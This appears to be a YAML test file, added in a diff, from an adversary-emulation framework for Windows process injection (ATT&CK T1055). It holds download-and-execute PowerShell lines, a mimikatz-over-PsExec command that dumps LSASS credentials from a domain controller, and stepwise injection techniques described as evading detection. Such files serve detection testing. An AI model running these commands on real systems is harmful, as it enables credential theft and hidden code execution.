@@ -1,0 +1,395 @@
+attack_technique: T1055
+display_name: Process Injection
+atomic_tests:
+- name: Shellcode execution via VBA
+  auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
+  description: |
+    This module injects shellcode into a newly created process and executes. By default the shellcode is created,
+    with Metasploit, for use on x86-64 Windows 10 machines.
+
+    Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
+    is required.
+  supported_platforms:
+  - windows
+  input_arguments:
+    txt_path:
+      description: Path to file containing VBA macro to run
+      type: path
+      default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The 64-bit version of Microsoft Office must be installed
+    prereq_command: |
+      try {
+        $wdApp = New-Object -COMObject "Word.Application"
+        $path = $wdApp.Path
+        Stop-Process -Name "winword"
+        if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
+  - description: |
+      "#{txt_path}" must exist on disk at specified location
+    prereq_command: |
+      if (Test-Path "#{txt_path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{txt_path}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt" -OutFile "#{txt_path}" -UseBasicParsing
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+      Invoke-Maldoc -macroFile "#{txt_path}" -officeProduct "Word" -sub "Execute"
+    name: powershell
+- name: Remote Process Injection in LSASS via mimikatz
+  auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
+  description: |
+    Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+    Especially useful against domain controllers in Active Directory environments.
+    It must be executed in the context of a user who is privileged on remote `machine`.
+
+    The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
+  supported_platforms:
+  - windows
+  input_arguments:
+    machine:
+      description: machine to target (via psexec)
+      type: string
+      default: DC1
+    mimikatz_path:
+      description: Mimikatz windows executable
+      type: path
+      default: '%tmp%\mimikatz\x64\mimikatz.exe'
+    psexec_path:
+      description: Path to PsExec
+      type: string
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
+    prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
+      $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
+      $zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
+      $mimikatz_exe = cmd /c echo #{mimikatz_path}
+      $basePath = Split-Path $mimikatz_exe | Split-Path
+      Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
+  - description: |
+      PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})
+    prereq_command: |
+      if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing
+      Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
+      New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "#{psexec_path}" -Force
+  executor:
+    command: |
+      "#{psexec_path}" /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
+    name: command_prompt
+    elevation_required: false # locally not, but remotely on target machine then yes
+- name: Section View Injection
+  auto_generated_guid: c6952f41-6cf0-450a-b352-2ca8dae7c178
+  description: |
+    This test creates a section object in the local process followed by a local section view.
+    The shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. 
+    A thread is then created in the target process, using the remote section view as start address.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $notepad = Start-Process notepad -passthru
+      Start-Process "$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe"
+    cleanup_command: Stop-Process $notepad.pid
+    name: powershell
+- name: Dirty Vanity process Injection
+  auto_generated_guid: 49543237-25db-497b-90df-d0a0a6e8fe2c
+  description: |
+    This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process
+    with shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at 
+    BlackHat Europe 2022. Shellcode will open a messsage box and a notepad.
+  supported_platforms:
+  - windows
+  input_arguments:
+    pid:
+      description: Parent process ID
+      type: string
+      default: (Start-Process calc.exe -PassThru).Id
+  executor:
+    command: |
+      Start-Process "$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe" #{pid}
+    cleanup_command: 'Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force'
+    name: powershell
+    elevation_required: false
+- name: Read-Write-Execute process Injection
+  auto_generated_guid: 0128e48e-8c1a-433a-a11a-a5387384f1e1
+  description: |
+    This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.
+    The RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms 
+    that relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.
+    The injected shellcode will open a message box and a notepad.
+    RWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.
+    More details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.
+    The original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.
+  supported_platforms:
+  - windows
+  input_arguments:
+    vuln_dll:
+      description: vulnerable DLL 
+      type: path
+      default: PathToAtomicsFolder\T1055\bin\x64\vuln_dll\msys-2.0.dll
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Utility to inject must exist on disk at specified location (#{vuln_dll})
+    prereq_command: |
+      if (Test-Path "#{vuln_dll}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{vuln_dll}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/vuln_dll/msys-2.0.dll" -OutFile "#{vuln_dll}"
+  executor:
+    command: |
+      $address = (& "$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe" "$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\" | Out-String | Select-String -Pattern "VirtualAddress: (\w+)").Matches.Groups[1].Value
+      & "PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe" "#{vuln_dll}" $address
+    cleanup_command: 'Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force'
+    name: powershell
+    elevation_required: true
+- name: Process Injection with Go using UuidFromStringA WinAPI
+  auto_generated_guid: 2315ce15-38b6-46ac-a3eb-5e21abef2545
+  description: |
+    Uses WinAPI UuidFromStringA to load shellcode to a memory address then executes the shellcode using EnumSystemLocalesA.
+    With this technique, memory is allocated on the heap and does not use commonly suspicious APIs such as VirtualAlloc, WriteProcessMemory, or CreateThread 
+    - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#uuidfromstringa)
+    - References: 
+      - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
+      - https://twitter.com/_CPResearch_/status/1352310521752662018
+      - https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $PathToAtomicsFolder\T1055\bin\x64\UuidFromStringA.exe -debug
+    cleanup_command: |
+       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+- name: Process Injection with Go using EtwpCreateEtwThread WinAPI
+  auto_generated_guid: 7362ecef-6461-402e-8716-7410e1566400
+  description: |
+    Uses EtwpCreateEtwThread function from ntdll.dll to execute shellcode within the application's process.
+    This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
+
+    Steps taken with this technique
+    1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+    2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+    3. Change the memory page permissions to Execute/Read with VirtualProtect
+    4. Call EtwpCreateEtwThread on shellcode address
+    5. Call WaitForSingleObject so the program does not end before the shellcode is executed
+
+    - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#EtwpCreateEtwThread)
+    - References: 
+      - https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3
+      - https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug
+    cleanup_command: |
+       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+- name: Remote Process Injection with Go using RtlCreateUserThread WinAPI
+  auto_generated_guid: a0c1725f-abcd-40d6-baac-020f3cf94ecd
+  description: |
+    Executes shellcode in a remote process.
+
+    Steps taken with this technique
+    1. Get a handle to the target process
+    2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
+    3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
+    4. Change the memory page permissions to Execute/Read with VirtualProtectEx
+    5. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread
+    6. Close the handle to the remote process
+
+    - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)
+    - References: 
+      - https://www.cobaltstrike.com/blog/cobalt-strikes-process-injection-the-details-cobalt-strike
+  supported_platforms:
+  - windows
+  input_arguments:
+    spawn_process_path:
+      description: Path of the binary to spawn
+      type: string
+      default: 'C:\Windows\System32\werfault.exe'
+    spawn_process_name:
+      description: Name of the process spawned
+      type: string
+      default: werfault
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $process = Start-Process #{spawn_process_path} -passthru
+      $PathToAtomicsFolder\T1055\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug
+    cleanup_command: |
+       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+       Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+- name: Remote Process Injection with Go using CreateRemoteThread WinAPI
+  auto_generated_guid: 69534efc-d5f5-4550-89e6-12c6457b9edd
+  description: |
+    Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellocde in a remote process.
+
+    This application leverages functions from the golang.org/x/sys/windows package, where feasible, like the windows.OpenProcess().
+
+    Steps taken with this technique
+    1. Get a handle to the target process
+    2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
+    3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
+    4. Change the memory page permissions to Execute/Read with VirtualProtectEx
+    5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
+    6. Close the handle to the remote process
+
+    - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethread)
+     - References:
+      - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
+  supported_platforms:
+  - windows
+  input_arguments:
+    spawn_process_path:
+      description: Path of the binary to spawn
+      type: string
+      default: 'C:\Windows\System32\werfault.exe'
+    spawn_process_name:
+      description: Name of the process spawned
+      type: string
+      default: werfault
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $process = Start-Process #{spawn_process_path} -passthru
+      $PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug
+    cleanup_command: |
+       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+       Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+- name: Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively)
+  auto_generated_guid: 2a4ab5c1-97ad-4d6d-b5d3-13f3a6c94e39
+  description: |
+    Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellcode in a remote process.
+
+    This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
+
+    1. Get a handle to the target process
+    2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
+    3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
+    4. Change the memory page permissions to Execute/Read with VirtualProtectEx
+    5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
+    6. Close the handle to the remote process
+
+    - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethreadnative)
+  supported_platforms:
+  - windows
+  input_arguments:
+    spawn_process_path:
+      description: Path of the binary to spawn
+      type: string
+      default: 'C:\Windows\System32\werfault.exe'
+    spawn_process_name:
+      description: Name of the process spawned
+      type: string
+      default: werfault
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $process = Start-Process #{spawn_process_path} -passthru
+      $PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug
+    cleanup_command: |
+       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+       Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+- name: Process Injection with Go using CreateThread WinAPI
+  auto_generated_guid: 2871ed59-3837-4a52-9107-99500ebc87cb
+  description: |
+    This program executes shellcode in the current process using the following steps
+    1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+    2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+    3. Change the memory page permissions to Execute/Read with VirtualProtect
+    4. Call CreateThread on shellcode address
+    5. Call WaitForSingleObject so the program does not end before the shellcode is executed
+
+    This program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them
+
+    - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthread)
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug
+    cleanup_command: |
+       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+- name: Process Injection with Go using CreateThread WinAPI (Natively)
+  auto_generated_guid: 2a3c7035-d14f-467a-af94-933e49fe6786
+  description: |
+    This program executes shellcode in the current process using the following steps
+    1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+    2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+    3. Change the memory page permissions to Execute/Read with VirtualProtect
+    4. Call CreateThread on shellcode address
+    5. Call WaitForSingleObject so the program does not end before the shellcode is executed
+
+    This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
+
+    - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthreadnative)
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug
+    cleanup_command: |
+       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+- name: UUID custom process Injection
+  auto_generated_guid: 0128e48e-8c1a-433a-a11a-a5304734f1e1
+  description: |
+    The UUIDs Process Injection code was first introduced by the NCC Group. The code can be stored in UUID forms on the heap and converted back to binary via UuidFromStringA at runtime. In this new custom version of UUID injection, EnumSystemLocalesA is the only API called to execute the code. We used custom UuidToString and UuidFromString implementations to avoid using UuidFromStringA and RPCRT4.dll, thereby eliminating the static signatures. This technique also avoided the use of VirtualAlloc, WriteProcessMemory and CreateThread
+    
+    The injected shellcode will open a message box and a notepad.
+    
+    Reference to NCC Group: https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
+    Concept from: http://ropgadget.com/posts/abusing_win_functions.html
+  supported_platforms:
+  - windows
+  input_arguments:
+    exe_binary:
+      description: PE binary
+      type: path
+      default: PathToAtomicsFolder\T1055\bin\x64\uuid_injection.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Portable Executable to inject must exist at specified location (#{exe_binary})
+    prereq_command: |
+      if (Test-Path "#{exe_binary}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{exe_binary}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/uuid_injection.exe" -OutFile "#{exe_binary}"
+  executor:
+    command: |-
+      Start-Process "#{exe_binary}"
+      Start-Sleep -Seconds 7
+      Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+    cleanup_command: 'Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force'
+    name: powershell
+    elevation_required: true
